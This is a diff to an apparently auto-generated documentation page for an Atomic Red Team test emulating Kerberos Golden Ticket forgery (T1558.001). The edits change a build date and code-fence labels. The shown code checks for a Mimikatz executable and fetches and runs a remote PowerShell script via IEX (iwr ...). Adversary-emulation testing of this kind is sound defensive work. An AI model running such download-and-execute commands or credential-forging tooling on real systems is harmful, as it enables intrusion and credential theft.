@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1558.001"
 attack_technique_name: "Steal or Forge Kerberos Tickets: Golden Ticket"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "powershell"
 aliases:
   - "9726592a-dabc-4d4d-81cd-44070008b3af"
@@ -78,14 +78,14 @@ Mimikatz executor must exist on disk and at specified location (#{mimikatz_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 $mimikatz_path = cmd /c echo #{mimikatz_path}
 if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
